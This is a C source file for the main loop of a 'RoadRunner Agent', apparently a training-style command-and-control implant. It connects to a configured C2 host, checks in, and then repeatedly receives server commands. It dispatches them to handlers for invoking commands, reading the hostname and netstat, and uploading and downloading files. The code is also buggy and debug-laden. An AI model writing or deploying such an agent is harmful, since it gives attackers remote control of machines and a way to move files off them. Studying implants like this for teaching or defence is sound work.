/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */
// include what we need for the functionality
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>

// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);

/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    Response* rsp;
    Command* cmd;
    // calloc(1, sizeof(Response));
    // calloc(1, sizeof(Command));
    // call our hello world function
    say_hello();
    // Agent logic
        // connect
    int sock_fd = connect_to_server();
        // Send checkin
    rsp = checkin_command();
    send_response(sock_fd, rsp);
    free_response(rsp);


        // Recieve
    while(1){
        //Response* rsp;
        cmd = receive_command(sock_fd);
        printf("**AGENT** cmd: %s args: %s\n", cmd->cmd, cmd->args);
            // perform command
        printf("%d\n", __LINE__);
        //alloc_command(cmd, cmd->cmd_len, cmd->args, cmd->args_len);
        printf("%d\n", __LINE__);
        int errcode = perform_command(cmd, &rsp);
        free_command(cmd);
        printf("%d\n", __LINE__);
        printf("**AGENT** response: %s\n", rsp->msg);
            // send response
        send_response(sock_fd, rsp);
        if(errcode == 0){
            printf("LINE %d\n", __LINE__);
            printf("SHUTTING DOWN\n");
            free_response(rsp);
            return 0;
        }
        free_response(rsp);
    }
    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    //start here
    // perform an "if else" tree checking the command against all known command strings

    // need to know if we need to continue running after executing the command
    // shutdown command is the only one to actually stop the agent

    //char cmdArray[9] = {"shutdown", "sleep", "download", "upload", "hostname", "proclist", "netstat", "proxy", "invoke"};
    printf("%d\n", __LINE__);
    // Response *send_rsp;
    //send_rsp = calloc(1, sizeof(Response));
    printf("%d\n", __LINE__);   


    if(strncmp(cmd->cmd, SLEEP_CMD_STR, 5) == 0){ //sleep
        printf("%d\n", __LINE__);
        *rsp_out = sleep_command(cmd); 
        printf("%d\n", __LINE__);  
    }
    else if(strncmp(cmd->cmd, SHUTDOWN_CMD_STR, 8) == 0){ //shutdown
        
        // send_rsp->msg = SHUTDOWN_MSG;
        // send_rsp->ret_code = 0;
        // send_rsp->msg_len = strlen(SHUTDOWN_MSG + 1);
        *rsp_out= alloc_response(0, SHUTDOWN_MSG, strlen(SHUTDOWN_MSG) + 1);
        return 0;
    }
    else if(strncmp(cmd->cmd, INVOKE_CMD_STR, 6) == 0){ //invoke
        *rsp_out = invoke_command(cmd);
    }
    else if (strncmp(cmd->cmd, HOSTNAME_CMD_STR, 8) == 0){ //hostname
        *rsp_out = hostname_command(cmd);
    }
    // else if(strncmp(cmd->cmd, PROCESS_LIST_CMD_STR, 8) == 0){ // proclist
    //     *rsp_out = process_list_command(cmd);
    // }
    else if(strncmp(cmd->cmd, NETSTAT_CMD_STR, 7) == 0){ //netstat
        *rsp_out = get_netstat_command(cmd);
    }
    // else if(strncmp(cmd, PROXY_CMD_STR, 5) == 0){ //proxy
    //     *rsp_out = PROXY_RSP_MSG;
    // }
    else if(strncmp(cmd->cmd, DOWNLOAD_CMD_STR, 8) == 0){ //download
        *rsp_out = download_file_command(cmd);
    }
    else if(strncmp(cmd->cmd, UPLOAD_CMD_STR, 6) == 0){ //upload
        *rsp_out = upload_file_command(cmd);
    }
    else{
        *rsp_out = alloc_response(1, BAD_COMMAND_MSG, strlen(BAD_COMMAND_MSG) + 1);
    }


    // RR_DEBUG_PRINT("received: shutdown command\n")
    // RR_DEBUG_PRINT("received: sleep command\n")
    // RR_DEBUG_PRINT("received: download command\n")
    // RR_DEBUG_PRINT("received: upload command\n")
    // RR_DEBUG_PRINT("received: hostname command\n")
    // RR_DEBUG_PRINT("received: process list command\n")
    // RR_DEBUG_PRINT("received: netstat command\n")
    // RR_DEBUG_PRINT("received: invoke command\n")
    // RR_DEBUG_PRINT("received: proxy command\n")

    return 1;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server.
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    char* stream_out = NULL;
    int totalTransmitted = 0;
    int bytesTransmitted = 0;
    // Serialize response
    int total_size = serialize_response(rsp, &stream_out);
    while(totalTransmitted < total_size){
        bytesTransmitted = write(sock_fd, stream_out + totalTransmitted, total_size - totalTransmitted);
        if(bytesTransmitted == -1){
           return true;
       }
       totalTransmitted += bytesTransmitted;
    }

    free(stream_out);
    // Send Response
    return false;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    // char* s_total_size = 0;
    // char* s_cmd_length = 0;
    // char* s_cmd = NULL;
    // char* s_args_length = 0;
    // char* s_args = NULL;
    int bytesReceived = 0;
    // Read from socket
    char dataBuffer[1024] = {'\0'};
    bytesReceived = recv(sock_fd, dataBuffer, 1024, 0);
    if(bytesReceived == -1){
       return 0;
    }
    // int total_size = ntohl(s_total_size);
    // bytesReceived = recv(sock_fd, s_cmd_length, 4, 0);
    // if(bytesReceived == -1){
    //    return 0;
    // }
    // int cmd_length = ntohl(s_cmd_length);
    // bytesReceived = recv(sock_fd, s_cmd, cmd_length, 0);
    // if(bytesReceived == -1){
    //    return 0;
    // }
    // bytesReceived = recv(sock_fd, s_args_length, 4, 0);
    // if(bytesReceived == -1){
    //    return 0;
    // }
    // int args_length = ntohl(s_args_length);
    // bytesReceived = recv(sock_fd, s_args, args_length, 0);
    // if(bytesReceived == -1){
    //    return 0;
    // }
    dataBuffer[1023] = '\0';

    // convert from network to host byte order
    long iConverted = ntohl(dataBuffer);
    // Validate message
    uint32_t total_size;
    deserialize_int(0, &dataBuffer, &total_size);
    // deserialize the command received from the server
    cmd = deserialize_command(total_size, &dataBuffer);

    printf("**AGENT** Received: %d\n", total_size);
    

    return cmd;
}


void* get_in_addr(struct sockaddr *sa){
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    int sock_fd = 0;
    // setup the address to HOST/PORT defined in roadrunner.h
    struct addrinfo* servInfo;
    struct addrinfo hints;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int errcode = getaddrinfo(HOST, PORT, &hints, &servInfo);
    if(errcode != 0){
       return -1;
    }

    struct addrinfo* pIter;

    for(pIter = servInfo; pIter != NULL; pIter = pIter->ai_next){
        sock_fd = socket(pIter->ai_family, pIter->ai_socktype, pIter->ai_protocol);

        if(sock_fd == -1){
            fprintf(stderr, "Error: Socket() -> %d\n", sock_fd);
            continue;
        }
        
        errcode = connect(sock_fd, pIter->ai_addr, pIter->ai_addrlen);
        if(errcode == -1){
            fprintf(stderr, "Error: Connect() -> %s\n", gai_strerror(errcode));
            close(sock_fd);
            continue;
       }
       break;
    }

    if(pIter == NULL){
        fprintf(stderr, "Error: Connect() failed.");
        return -2;
    }

    char hostString[INET6_ADDRSTRLEN] = {'\0'};
    inet_ntop(pIter->ai_family, pIter->ai_addr->sa_data, hostString, sizeof(hostString));
    printf("Connecting to %s\n", hostString);
    freeaddrinfo(servInfo);

    // int totalTransmitted = 0;
    // int bytesTransmitted = 0;
    // char* REQ = "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n";
    // while(totalTransmitted < strlen(REQ)){
    //     bytesTransmitted = write(sock_fd, REQ+totalTransmitted, strlen(REQ)-totalTransmitted);

    //     if(bytesTransmitted == -1){
    //         fprintf(stderr, "Error: Write() -> %d\n", bytesTransmitted);
    //             return -3;
    //     }
    //     totalTransmitted += bytesTransmitted;

    //     char dataBuffer[1024] = {'\0'};
    //     bytesTransmitted = recv(sock_fd, dataBuffer, 1024, 0);

    //     if(bytesTransmitted == -1){
    //         fprintf(stderr, "Error: Recv() -> %d.\n", bytesTransmitted);
    //         return -3;
    //     }
    //     dataBuffer[1023] = '\0';
    //     printf("Received Data\n----------\n%s\n-----------\n", dataBuffer);

    //     close(sock_fd);
    //     return 0;
    // }

    // connect
    return sock_fd;
}